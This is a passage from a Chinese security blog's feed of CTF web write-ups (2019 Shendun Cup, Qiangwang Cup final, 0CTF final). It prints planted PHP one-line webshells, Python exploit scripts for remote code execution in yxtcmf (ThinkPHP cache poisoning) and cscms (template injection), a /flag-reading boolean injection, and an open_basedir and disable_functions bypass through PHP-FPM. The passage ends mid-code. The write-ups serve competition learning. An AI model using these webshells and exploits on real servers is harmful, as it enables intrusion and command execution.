<span class="string">'test'</span>;</span><br><span class="line">$dbc = mysqli_connect($host, $username, $password, $database);</span><br><span class="line"><span class="keyword">if</span> (!$dbc)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">'Could not connect: '</span> . mysql_error());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//启用session</span></span><br><span class="line">session_start();</span><br><span class="line"></span><br><span class="line"><span class="comment">//根目录</span></span><br><span class="line">$basedir = <span class="string">''</span>; </span><br><span class="line"></span><br><span class="line">@<span class="keyword">eval</span>($_REQUEST[<span class="string">'c'</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p>预置后门5：about.php<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$file=$_GET[<span class="string">'file'</span>];</span><br><span class="line"><span class="keyword">include</span> $file;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p>预置后门6：a.php<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>($_REQUEST[<span class="string">'c'</span>]);</span><br><span class="line">var_dump($_SERVER);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p>预置后门7：.a.php<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>($_REQUEST[<span class="string">'c'</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p>预置后门8：admin/footer.php<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">$shell=$_POST[<span class="string">'shell'</span>];</span><br><span class="line">system($shell);</span><br><span class="line"><span class="keyword">if</span>($shell !=<span class="string">""</span>)&#123;</span><br><span class="line"><span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p>预置后门9：admin/header.php<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">$p=$_GET[<span class="string">'p'</span>];</span><br><span class="line"><span class="keyword">echo</span> $p;</span><br><span class="line">$q=exec($p);</span><br><span class="line">var_dump($q);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p>以及一个很裸的文件上传<br><img src="/images/2019-07-04-12-18-17.png" alt=""><br>所以基本无需分析，都是非常明显的一句话木马了。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">文章首发于嘶吼 https://www.4hou.com/web/19038.html</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;队友去参加了2019神盾杯上海市网络安全竞赛，线下有4道web题，就跟队友要来了源码进行了一波分析，由于题目较多，分为2篇撰写，本篇先写de
      
    
    </summary>
    
      <category term="web" scheme="http://skysec.top/categories/web/"/>
    
    
      <category term="web" scheme="http://skysec.top/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>2019 强网杯final Web Writeup</title>
    <link href="http://skysec.top/2019/06/16/2019-%E5%BC%BA%E7%BD%91%E6%9D%AFfinal-Web-Writeup/"/>
    <id>http://skysec.top/2019/06/16/2019-强网杯final-Web-Writeup/</id>
    <published>2019-06-16T13:52:24.000Z</published>
    <updated>2019-06-16T15:11:15.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>强网杯线下赛打的非常happy也非常累，感觉这种赛制非常有意思，早就厌倦了web的AD，这种cms的0/1day的挖掘非常带劲，就是和0ctf连着打，感觉命都没了（<br>线下赛共有3道web，分别是1道框架0/1day，2道cms前台getshell的0/1day，但是Laravel框架由于可以搜到相关CVE，于是本篇文章不再编写，只分析另外2个cms。</p><h2 id="yxtcmf"><a href="#yxtcmf" class="headerlink" title="yxtcmf"></a>yxtcmf</h2><h3 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h3><p>拿到这道题时，我先去搜集了相关信息，可以发现该cms是一个以thinkphp+bootstrap为框架进行开。可以理解为在thinkcmf上进行的二次开发。同时了解到是thinkphp3.2.3:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> THINK_VERSION     =   <span class="string">'3.2.3'</span>;</span><br></pre></td></tr></table></figure></p><p>同时题目文档描述，告知我们：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">已经删除可用的install , admin, UpdateController.class.php和SettingController.class.php文件夹和文件，相关思路请不要尝试</span><br></pre></td></tr></table></figure></p><p>所以不难发现，给我们的cms，已经没有后台了，所以只能前台getshell（<br>那么这里我也不赘述自己踩坑的环境了，直奔主题</p><h3 id="thinkphp缓存机制问题"><a href="#thinkphp缓存机制问题" class="headerlink" title="thinkphp缓存机制问题"></a>thinkphp缓存机制问题</h3><p>既然知道cms开发框架为thinkphp 3，那么势必会去搜集相关框架漏洞信息(因为yxtcmf搜到东西太少了)，除去搜到的一些注入问题，最能直接getshell的便是cache缓存机制的问题。<br>在如下文章：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://paper.seebug.org/374/</span><br></pre></td></tr></table></figure></p><p>可以发现如果我们可以利用缓存机制，并计算出缓存文件名，控制缓存内容，即可getshell。</p><h3 id="cache文件名"><a href="#cache文件名" class="headerlink" title="cache文件名"></a>cache文件名</h3><p>这里我们跟进yxtcmf的源代码，来到相关文件:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yxtedu/Core/Library/Think/Cache/Driver/File.class.php</span><br></pre></td></tr></table></figure></p><p>可以发现cache文件的命名规则如下：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">filename</span><span class="params">($name)</span> </span>&#123;</span><br><span class="line">        $name=md5(C(<span class="string">'DATA_CACHE_KEY'</span>).$name);</span><br><span class="line">        <span class="keyword">if</span>(C(<span class="string">'DATA_CACHE_SUBDIR'</span>)) &#123;</span><br><span class="line">            <span class="comment">// 使用子目录</span></span><br><span class="line">            $dir   =<span class="string">''</span>;</span><br><span class="line">            <span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;C(<span class="string">'DATA_PATH_LEVEL'</span>);$i++) &#123;</span><br><span class="line">                $dir.=$name&#123;$i&#125;.<span class="string">'/'</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(!is_dir(<span class="keyword">$this</span>-&gt;options[<span class="string">'temp'</span>].$dir)) &#123;</span><br><span class="line">                mkdir(<span class="keyword">$this</span>-&gt;options[<span class="string">'temp'</span>].$dir,<span class="number">0755</span>,<span class="keyword">true</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            $filename=$dir.<span class="keyword">$this</span>-&gt;options[<span class="string">'prefix'</span>].$name.<span class="string">'.php'</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            $filename=<span class="keyword">$this</span>-&gt;options[<span class="string">'prefix'</span>].$name.<span class="string">'.php'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;options[<span class="string">'temp'</span>].$filename;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></p><p>我们关注到相关信息：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$name=md5(C(<span class="string">'DATA_CACHE_KEY'</span>).$name);</span><br></pre></td></tr></table></figure></p><p>跟进变量<code>DATA_CACHE_KEY</code>:<br><img src="/images/2019-06-16-22-13-45.png" alt=""><br>不难发现，该值为空，故此cache文件名为固定值，我们可在本地运行代码，拿到cache文件名。</p><h3 id="cache文件内容"><a href="#cache文件内容" class="headerlink" title="cache文件内容"></a>cache文件内容</h3><p>知道了cache文件名，那么如何控制cache的文件内容呢？<br>在开发手册中提及，我们可以使用S()进行缓存：<br><img src="/images/2019-06-16-22-19-33.png" alt=""><br>我们跟进S()函数，发现最后会进入set方法：<br><img src="/images/2019-06-16-22-23-44.png" alt=""><br>我们继续跟进set方法：<br><img src="/images/2019-06-16-22-25-05.png" alt=""><br>不难发现文件内容的写入操作。注意到写入时候，会默认在最前面加上注释符<code>\\</code>，所以我们可以用换行符bypass，例如：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\nvar_dump($_GET[a]);</span><br></pre></td></tr></table></figure></p><p>即可bypass注释符。<br>既然知道通过S函数可以控制cache文件内容，那么就需要找如何触发该函数。<br>我们全局搜索<code>S(</code>，可以发现如下路径中，sp_set_dynamic_config有调用：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">application/Common/Common/function.php</span><br></pre></td></tr></table></figure></p><p><img src="/images/2019-06-16-22-30-47.png" alt=""><br>我们关注变量$configs，发现其会与传入的$data进行array_merge，所以可认为写入内容可控。</p><h3 id="cache写入路由"><a href="#cache写入路由" class="headerlink" title="cache写入路由"></a>cache写入路由</h3><p>故此我们可以全局搜索函数<code>sp_set_dynamic_config</code>，查找调用处：<br><img src="/images/2019-06-16-22-33-33.png" alt=""><br>我们可以发现大量路由有相关调用，但是否真的可以使用呢？答案是否定的，由于该cms删除了后台，以至于所有需要后台登录的路由均无法使用，一旦调用，则会触发后台文件入口里的：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">header(&quot;Location: ../index.php?g=admin&amp;m=public&amp;a=login&quot;.$upw );</span><br></pre></td></tr></table></figure></p><p>进行重定向跳转，所以我们必须要找无需后台登入的路由，以达到我们的目的。<br>这里我寻找的方式比较简单，只要找到没有继承<code>AdminbaseController</code>类的即可。<br>那么不难发现，在如下文件中，我们可以利用：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">application/Api/Controller/OauthController.class.php</span><br></pre></td></tr></table></figure></p><p>关注到其调用函数处：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">injectionAuthocode</span><span class="params">()</span></span>&#123;</span><br><span class="line">       $postdata=I(<span class="string">'post.'</span>);</span><br><span class="line">       $configs[<span class="string">"authoCode"</span>]=$postdata[<span class="string">'authoCode'</span>];</span><br><span class="line">       sp_set_dynamic_config($configs);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure></p><p>发现我们可以直接通过post传参控制$postdata的值，并利用sp_set_dynamic_config写入缓存文件。</p><h3 id="exp编写"><a href="#exp编写" class="headerlink" title="exp编写"></a>exp编写</h3><p>那么整个利用方式就非常清晰了：<br>1.使用如下路由，POST发送恶意数据：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">index.php?g=api&amp;m=oauth&amp;a=injectionAuthocode</span><br></pre></td></tr></table></figure></p><p>2.由于injectionAuthocode方法调用了sp_set_dynamic_config方法，而sp_set_dynamic_config调用了S()，导致我们的恶意数据被写入cache。<br>3.访问cache文件getshell。<br>exp如下：<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line">host=<span class="string">'http://192.168.43.85/'</span></span><br><span class="line">url=host+<span class="string">'index.php?g=api&amp;m=oauth&amp;a=injectionAuthocode'</span></span><br><span class="line">data = &#123;</span><br><span class="line"> <span class="string">'authoCode'</span>:<span class="string">'\nvar_dump($_GET[a]); @eval($_GET[a]);#'</span></span><br><span class="line">&#125;</span><br><span class="line">r = requests.post(url=url,data=data)</span><br><span class="line">url = host+<span class="string">'data/runtime/Temp/ed182ead0631e95e68e008bc1d3af012.php'</span></span><br><span class="line">data = &#123;</span><br><span class="line">  <span class="string">'a'</span>:<span class="string">"system(\"ls\");"</span></span><br><span class="line">&#125;</span><br><span class="line">r = requests.post(url=url,params=data)</span><br><span class="line"><span class="keyword">print</span> r.content</span><br></pre></td></tr></table></figure></p><h2 id="cscms"><a href="#cscms" class="headerlink" title="cscms"></a>cscms</h2><h3 id="信息搜集-1"><a href="#信息搜集-1" class="headerlink" title="信息搜集"></a>信息搜集</h3><p>拿到该题后，我第一时间与github上的版本进行了diff，发现如下信息:<br><img src="/images/2019-06-16-22-40-59.png" alt=""><br>给我们的版本是4.1.75，时间为20170715，而github版本为4.1.8，时间为20170825。<br>而在cscms官方网站中给出过相关补丁信息：<br><img src="/images/2019-06-16-22-42-21.png" alt=""><br>于是我迅速的将目光锁定在了模板注入上，但很遗憾，官网的补丁下载下来的内容为空，我查询相关漏洞描述也一无所获，于是决定自己手动挖掘。</p><h3 id="漏洞点发掘"><a href="#漏洞点发掘" class="headerlink" title="漏洞点发掘"></a>漏洞点发掘</h3><p>首先全局搜索危险函数，例如eval、system、assert等，不难发现如下位置：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">upload/cscms/app/models/Csskins.php</span><br></pre></td></tr></table></figure></p><p>其中存在如下函数:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">cscms_php</span><span class="params">($php,$content,$str)</span> </span>&#123;</span><br><span class="line">$evalstr=<span class="string">" return $content"</span>;</span><br><span class="line">$newsphp=<span class="keyword">eval</span>($evalstr);</span><br><span class="line">      $str=str_replace($php,$newsphp,$str);</span><br><span class="line"><span class="keyword">return</span> $str;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure></p><p>我们注意到这里有明显的eval函数调用，那么我们查阅什么位置使用了该函数：<br><img src="/images/2019-06-16-22-48-24.png" alt=""><br>发现在upload/cscms/app/models/Csskins.php中template_parse函数调用了cscms_php函数，而template_parse正是模板解析函数，与我们的信息搜集部分照相呼应。</p><h3 id="模板解析函数"><a href="#模板解析函数" class="headerlink" title="模板解析函数"></a>模板解析函数</h3><p>那么该函数如何解析php语句呢？<br>我们注意到相关操作:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">preg_match_all(<span class="string">'/&#123;cscmsphp&#125;([\s\S]+?)&#123;\/cscmsphp&#125;/'</span>,$str,$php_arr);</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>($php_arr[<span class="number">0</span>]))&#123;</span><br><span class="line"><span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;count($php_arr[<span class="number">0</span>]);$i++)&#123;</span><br><span class="line">    $str=<span class="keyword">$this</span>-&gt;cscms_php($php_arr[<span class="number">0</span>][$i],$php_arr[<span class="number">1</span>][$i],$str);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">unset</span>($php_arr);</span><br></pre></td></tr></table></figure></p><p>发现解析时会进行正则匹配，取出如下部分：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/&#123;cscmsphp&#125;([\s\S]+?)&#123;\/cscmsphp&#125;/</span><br></pre></td></tr></table></figure></p><p>我们可以使用类似于：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;cscmsphp&#125;phpinfo();&#123;/cscmsphp&#125;</span><br></pre></td></tr></table></figure></p><p>来执行命令。</p><h3 id="模板渲染路由"><a href="#模板渲染路由" class="headerlink" title="模板渲染路由"></a>模板渲染路由</h3><p>既然找到了相关执行php语句的函数，那么只差一个调用该函数的路由了。依旧是全局搜索：<br><img src="/images/2019-06-16-22-56-58.png" alt=""><br>可以发现在留言板功能中有所调用，而调用位置我们看到，在gbook<em>list方法中：<br><img src="/images/2019-06-16-23-04-12.png" alt=""><br>其会从数据库中取出留言，然后进行渲染，那么如果想要触发模板渲染攻击，势必需要在留言插入时，就写入恶意数据，我们查看留言写入路由：<br><img src="/images/2019-06-16-23-05-09.png" alt=""><br>即调用add即可写入数据，插入数据库。<br>同时经过本地测试发现：<br>![](/images/41560697631</em>.pic.jpg)<br>单引号会被转义，但我们的shell无需单引号：<br><img src="/images/21560697598_.pic.jpg" alt=""><br>并且在访问index.php/gbook/lists/1时，会触发相关代码：<br><img src="/images/31560697606_.pic.jpg" alt=""></p><h3 id="exp编写-1"><a href="#exp编写-1" class="headerlink" title="exp编写"></a>exp编写</h3><p>故此整个流程变得非常容易：<br>首先访问路由：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.43.85/upload/index.php/gbook</span><br></pre></td></tr></table></figure></p><p>进行留言，留言内容为：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;cscmsphp&#125;assert($_GET[sky]);&#123;/cscmsphp&#125;</span><br></pre></td></tr></table></figure></p><p>然后运行脚本，可进行RCE：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import urllib</span><br><span class="line">host=<span class="string">'http://192.168.43.85/'</span></span><br><span class="line">url=host+<span class="string">'upload/index.php/gbook/lists/1'</span></span><br><span class="line">data = &#123;</span><br><span class="line"> <span class="string">'sky'</span>:r<span class="string">"system('ls');"</span></span><br><span class="line">&#125;</span><br><span class="line">r = requests.get(url=url,params=data)</span><br><span class="line"><span class="keyword">print</span> r.content</span><br></pre></td></tr></table></figure></p><h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>总体来说，这样的竞技模式更加有趣，更贴近真实情况，可以让参赛人员在比赛过程中提高对cms漏洞挖掘能力，对这样的赛制表示点赞~</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;强网杯线下赛打的非常happy也非常累，感觉这种赛制非常有意思，早就厌倦了web的AD，这种cms的0/1day的挖掘非常带劲，就是和0ct
      
    
    </summary>
    
      <category term="web" scheme="http://skysec.top/categories/web/"/>
    
    
      <category term="web" scheme="http://skysec.top/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>2019 0ctf final Web Writeup（1）</title>
    <link href="http://skysec.top/2019/06/10/2019%200ctf%20final%20Web%20Writeup%EF%BC%881%EF%BC%89/"/>
    <id>http://skysec.top/2019/06/10/2019 0ctf final Web Writeup（1）/</id>
    <published>2019-06-10T07:38:25.000Z</published>
    <updated>2019-07-04T04:24:04.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>鸽了好久的Blog，因为自己事务缠身，一直没时间写一下最近比赛的题解，趁近日有空，来填坑~<br>第一次参加0ctf新星赛就拿了冠军，还是非常开心的。比赛过程中，web共4道题，我有幸做出3道，java实在不太擅长，哭了（，另一道是ocaml的题目，涉及小trick和逻辑问题，准备放在后面和java一起编写（希望不要咕咕咕了）。这里写出另外两道题目的题解如下：</p><h2 id="114514-calcalcalc"><a href="#114514-calcalcalc" class="headerlink" title="114514_calcalcalc"></a>114514_calcalcalc</h2><p>本题是2019 RCTF calcalcalc的改版，这次限制了之前的时间延迟注入的问题，同时需要Bypass validator：<img src="/images/2019-07-02-20-41-31.png" alt=""><br>我们可以使用<code>__proto__</code>来进行Bypass：<br><img src="/images/2019-07-02-20-42-54.png" alt=""><br>至于时间注入的问题，我们可以使用bool注入来解决这个问题：<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">"__proto__"</span>: &#123;&#125;, <span class="string">"isVip"</span>: true, <span class="string">"expression"</span>: <span class="string">"1//1 and ord(open('/flag').read()[1]) &gt;-1 and 1\n"</span>&#125;</span><br></pre></td></tr></table></figure></p><p>php下：<br><img src="/images/2019-07-02-20-33-27.png" alt=""><br>nodejs下：<br><img src="/images/2019-07-02-20-34-37.png" alt=""><br>python下：<br><img src="/images/2019-07-02-20-34-48.png" alt=""><br>当<code>ord(open(&#39;/flag&#39;).read()[1]) &gt;-1</code>成立时，python返回1，与另外两个保持一致。当<code>ord(open(&#39;/flag&#39;).read()[1]) &gt;-1</code>不成立时，返回<code>That&#39;s classified information. - Asahina Mikuru</code>。故此可以进行bool注入：<br><img src="/images/2019-07-02-16-12-39.png" alt=""></p><h2 id="wallbreaker-not-very-hard"><a href="#wallbreaker-not-very-hard" class="headerlink" title="wallbreaker_not_very_hard"></a>wallbreaker_not_very_hard</h2><p>本题是2019 0ctf online和2019 *CTF的难度提升题，拿到题目较为明显的2个条件：<br>首先是disable_function，过滤了如下函数：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Wall B: pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,system,exec,shell_exec,popen,putenv,proc_open,passthru,symlink,link,syslog,imap_open,dl,system,mb_send_mail,mail,error_log</span><br></pre></td></tr></table></figure></p><p>然后是open_basedir限制了如下目录：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Wall C: /var/www/html:/tmp</span><br></pre></td></tr></table></figure></p><p>题目提示我们：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Here&apos;s a backdoor, to help you break Wall A.</span><br><span class="line">But you should find the key of the backdoor.</span><br></pre></td></tr></table></figure></p><p>于是进行目录爆破，得到如下文件泄露：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.106:10001/.index.php.swp</span><br></pre></td></tr></table></figure></p><p>打开后发现后门:<br><img src="/images/2019-07-01-22-24-13.png" alt=""><br>这里很自然想到*CTF的解法：<br><a href="https://github.com/sixstars/starctf2019/tree/master/web-echohub" target="_blank" rel="noopener">https://github.com/sixstars/starctf2019/tree/master/web-echohub</a><br>那么既然需要使用<code>stream_socket_client</code>和<code>stream_socket_sendto</code>连接php-fpm服务，那么我们需要知道<code>unix:///run/php/php7.3-fpm.sock</code>文件名，那么肯定需要Bypass open_basedir。<br>这里容易想到之前的相关poc，参考链接如下：<br><a href="https://skysec.top/2019/04/12/%E4%BB%8EPHP%E5%BA%95%E5%B1%82%E7%9C%8Bopen-basedir-bypass/">https://skysec.top/2019/04/12/%E4%BB%8EPHP%E5%BA%95%E5%B1%82%E7%9C%8Bopen-basedir-bypass/</a><br>尝试构造：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">chdir(<span class="string">'/tmp'</span>);</span><br><span class="line">mkdir(<span class="string">'sky'</span>);</span><br><span class="line">chdir(<span class="string">'sky'</span>);</span><br><span class="line">ini_set(<span class="string">'open_basedir'</span>,<span class="string">'..'</span>);</span><br><span class="line">chdir(<span class="string">'..'</span>);</span><br><span class="line">chdir(<span class="string">'..'</span>);</span><br><span class="line">chdir(<span class="string">'..'</span>);</span><br><span class="line">chdir(<span class="string">'..'</span>);</span><br><span class="line">ini_set(<span class="string">'open_basedir'</span>,<span class="string">'/'</span>);</span><br><span class="line">var_dump(ini_get(<span class="string">'open_basedir'</span>));</span><br><span class="line">var_dump(glob(<span class="string">'*'</span>));</span><br></pre></td></tr></table></figure></p><p>发现可以成功bypass open_basedir<br><img src="/images/2019-07-01-22-43-21.png" alt=""><br>通过列目录，可找到文件名如下：<br><img src="/images/2019-07-01-22-48-35.png" alt=""><br>但尝试使用<code>/var/run/php/U_wi11_nev3r_kn0w.sock</code>，并使用*ctf exp时，发现依然会被disable function限制，那么显然我们还得继续bypass disable function。<br>那么自然容易想到寻找引入拓展的地方，引入一个hack.so文件，hook函数，达到RCE的目的，这一点和之前2019 0ctf online的时候非常相似，这是当时已经给了现成的拓展和可用函数。<br>这里可以参考ph牛的文章：<br><a href="https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html</a><br>在文章中，ph牛剖析的非常透彻，可以帮助我们理解PHP-FPM未授权访问漏洞，既然知道了我们需要构造fastcgi协议和fpm进行通信。<br>那么势必需要找到fastcgi中是否有更改disable_functions的选项，或者引入extension的选项。同时利用auto_prepend_file和auto_append_file让php执行任意代码。并且文中提及，PHP-FPM的两个环境变量，PHP_VALUE和PHP_ADMIN_VALUE。这两个环境变量就是用来设置PHP配置项的，PHP_VALUE可以设置模式为PHP_INI_USER和PHP_INI_ALL的选项，PHP_ADMIN_VALUE可以设置所有选项。但disable_functions除外，这个选项是PHP加载的时候就确定了，在范围内的函数直接不会被加载到PHP上下文中。<br><img src="/images/2019-07-02-13-08-58.png" alt=""><br>所以思路更加明确了，我们应该是要找到PHP_ADMIN_VALUE的某个选项，可以帮助我们引入extension。<br>搜索易得,我们可以利用如下方式，引入指定位置的so文件：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PHP_ADMIN_VALUE[&apos;extension&apos;] = /tmp/sky.so</span><br></pre></td></tr></table></figure></p><p> 这里我们改写ph牛提供的脚本：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://gist.github.com/phith0n/9615e2420f31048f7e30f3937356cf75</span><br></pre></td></tr></table></figure></p><p><img src="/images/2019-07-02-13-19-29.png" alt=""><br>可以构造出如下exp：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span 